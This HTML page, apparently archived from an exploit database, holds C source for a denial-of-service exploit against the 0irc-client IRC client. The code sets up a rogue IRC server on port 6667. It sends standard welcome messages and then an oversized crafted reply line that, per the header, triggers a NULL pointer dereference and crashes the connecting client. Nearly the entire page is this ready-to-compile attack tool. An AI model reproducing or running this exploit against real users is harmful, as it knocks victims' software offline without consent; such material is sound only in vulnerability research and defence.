<html><head><title>0irc-client v1345 build20060823 Denial of Service  Exploit</title></head><pre>/*
	0irc-client v1345 build 20060823 DoS Exploit By DiGitalX (DiGi7alX@Gmail.com)
	Date: 22/3/2007 -- MicroSystem Team -- Site: http://DiGitalX.I.am
	Description: 0irc-client suffers from a NULL pointer derefrencing bug.
*/

#define WIN32_LEAN_AND_MEAN
#include &lt;winsock2.h&gt;
#include &lt;windows.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

#pragma comment(lib, &quot;wsock32.lib&quot;)

// `perl -e &quot;print 'a' x 623&quot;;`
#define As &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;

int main()
{
	struct sockaddr_in sa, nsa;
	SOCKET s, ns;
	WSADATA wsa;
	int err, val;
	char buffer[1000]; /* evil buffer holder */

	printf(&quot;0irc-client v1345 build 20060823 DoS Exploit By DiGitalX\n&quot;);
	printf(&quot;MicroSystem Team -- Date: 22/3/2007 -- http://DiGitalX.I.am\n&quot;);
	printf(&quot;Contact: DiGi7alX@Gmail.com\n\n&quot;);

	printf(&quot;Initializing...\n&quot;);

	/* first open the ircd */
	//fire up winsock
	if ((err = WSAStartup(MAKEWORD(1, 1), &amp;wsa)) != 0) {
		//if winsock is sick :P
		printf(&quot;Error: Cannot initialize winsock (%d).\n&quot;, err);
		return 1;
	}
	//create a socket
	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == INVALID_SOCKET) {
		//if socket cannot be created inform user
		printf(&quot;Error: Cannot create socket (%d).\n&quot;, WSAGetLastError());
		return 1;
	}
	//starting building the sockaddr_in struct
	memset(&amp;sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_addr.S_un.S_addr = INADDR_ANY;
	sa.sin_port = htons(6667); /* default ircd port */
	//now bind the socket to the port
	if (bind(s, (const struct sockaddr *)&amp;sa, sizeof(sa)) == SOCKET_ERROR) {
		//if bind error inform user
		printf(&quot;Error: Cannot bind socket to port 6667 (%d).\n&quot;, WSAGetLastError());
		return 1;
	}
	//do listen for incoming connections
	if (listen(s, SOMAXCONN) == SOCKET_ERROR) {
		//cannot listen tell user
		printf(&quot;Error: Cannot listen for incoming connections (%d).\n&quot;, WSAGetLastError());
		return 1;
	}
	//listen OK
	//set sockaddr_in structcure size
	val = sizeof(nsa);
	//now do accept clients
	printf(&quot;Now connect using 0irc client.\n&quot;);
	if ((ns = accept(s, (struct sockaddr *)&amp;nsa, &amp;val)) == INVALID_SOCKET) {
		//if accept fails
		printf(&quot;Error: Cannot accept incoming connection (%d).\n&quot;, WSAGetLastError());
		return 1;
	}
	//accept OK .. inform user of new connection
	printf(&quot;New Connection: %s\n&quot;, inet_ntoa(nsa.sin_addr));
	//now the real job begins :D
	snprintf(buffer, sizeof(buffer)-1, &quot;:aaa 001 DiGitalX\r\n\0&quot;);
	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
		//oops!! error
		if (err == SOCKET_ERROR) printf(&quot;Error: Cannot send evil buffer (%d).\n&quot;, WSAGetLastError());
		else printf(&quot;Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n&quot;, err, strlen(buffer));
		return 1;
	}
	snprintf(buffer, sizeof(buffer)-1, &quot;:aaa 002 DiGitalX\r\n\0&quot;);
	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
		//oops!! error
		if (err == SOCKET_ERROR) printf(&quot;Error: Cannot send evil buffer (%d).\n&quot;, WSAGetLastError());
		else printf(&quot;Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n&quot;, err, strlen(buffer));
		return 1;
	}
	snprintf(buffer, sizeof(buffer)-1, &quot;:aaa 003 DiGitalX\r\n\0&quot;);
	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
		//oops!! error
		if (err == SOCKET_ERROR) printf(&quot;Error: Cannot send evil buffer (%d).\n&quot;, WSAGetLastError());
		else printf(&quot;Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n&quot;, err, strlen(buffer));
		return 1;
	}
	snprintf(buffer, sizeof(buffer)-1, &quot;:aaa 004 DiGitalX\r\n\0&quot;);
	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
		//oops!! error
		if (err == SOCKET_ERROR) printf(&quot;Error: Cannot send evil buffer (%d).\n&quot;, WSAGetLastError());
		else printf(&quot;Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n&quot;, err, strlen(buffer));
		return 1;
	}
	snprintf(buffer, sizeof(buffer)-1, &quot;:aaa 005 DiGitalX\r\n\0&quot;);
	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
		//oops!! error
		if (err == SOCKET_ERROR) printf(&quot;Error: Cannot send evil buffer (%d).\n&quot;, WSAGetLastError());
		else printf(&quot;Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n&quot;, err, strlen(buffer));
		return 1;
	}
	snprintf(buffer, sizeof(buffer)-1, &quot;:&quot;As&quot; 727 DiGitalX\r\n\0&quot;);
	if ((err = send(ns, buffer, strlen(buffer), 0)) != strlen(buffer)) {
		//oops!! error
		if (err == SOCKET_ERROR) printf(&quot;Error: Cannot send evil buffer (%d).\n&quot;, WSAGetLastError());
		else printf(&quot;Error: Evil buffer not sent properly. (%d/%d Bytes) sent.\n&quot;, err, strlen(buffer));
		return 1;
	}
	//wait sometime
	Sleep(1200);
	//cleanup
	//close sockets
	closesocket(ns);
	closesocket(s);
	//close winsock
	WSACleanup();

	return 0; /* end of work :D */
}

// milw0rm.com [2007-03-22]</pre></html>